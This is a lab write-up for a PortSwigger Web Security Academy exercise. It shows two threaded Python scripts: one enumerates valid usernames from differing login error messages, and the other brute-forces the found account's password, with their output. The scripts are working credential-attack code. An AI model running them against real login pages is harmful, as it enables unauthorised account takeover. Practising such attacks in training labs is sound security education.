# Username enumeration via different responses

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses), you'll learn: Username enumeration via different responses! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221032856.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221032908.png)

**Let's try a username:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221033010.png)

As you can see, when we input a wrong username, it has an error: `Invalid username`.

**Armed with that information, we can enumerate all usernames via a list of username.**

**To do so, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username' not in loginRequestText:
        print(f'[+] Found user: {username}')

def main():
    url = 'https://0a8400030305e48fc1f053e7000a00e9.web-security-academy.net/login'
    cookie = {'session': 'TJrmhzUBietntmaad88AmJSOn8rzuPU5'}

    userFileName = './auth_username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_username.py
[+] Found user: al
```

- Found user `al`.

Next, we need to brute force that account's password.

**But first, let's try to type an invalid password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221034626.png)

**Again, we can do the same thing via python:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    loginData = {
        'username': 'al',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Incorrect password' not in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0a8400030305e48fc1f053e7000a00e9.web-security-academy.net/login'
    cookie = {'session': 'TJrmhzUBietntmaad88AmJSOn8rzuPU5'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    for password in listPassword:
        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password.py
[+] Found password: qwertyuiop
```

- Found user `al`'s password: `qwertyuiop`.

**Let's login as that user!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221035025.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-1/images/Pasted%20image%2020221221035031.png)

We're user `al`!

# What we've learned:

1. Username enumeration via different responses